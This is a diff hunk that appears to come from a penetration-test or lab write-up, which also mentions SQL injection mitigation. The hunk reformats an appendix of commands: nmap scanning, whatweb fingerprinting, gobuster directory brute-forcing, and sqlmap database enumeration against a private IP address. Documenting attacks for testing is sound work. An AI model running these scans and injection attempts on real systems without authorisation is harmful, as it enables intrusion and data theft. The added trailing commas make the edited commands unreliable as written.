@@ -48,9 +48,9 @@ Mitigation (SQLi): Parameterized queries/prepared statements, ORM parameter bind
 
 Appendix – Commands
 
-nmap 10.201.9.34 -Pn -n -p- --open -sV -T4 -oN nmap.txt
-whatweb http://10.201.9.34
-gobuster dir -u http://10.201.9.34/ -w /root/c.txt 
-sqlmap -u "http://10.201.9.34/products/1" --batch --dbs
+nmap 10.201.9.34 -Pn -n -p- --open -sV -T4 -oN nmap.txt, 
+ whatweb http://10.201.9.34, 
+ gobuster dir -u http://10.201.9.34/ -w /root/c.txt ,
+ sqlmap -u "http://10.201.9.34/products/1" --batch --dbs
 
 
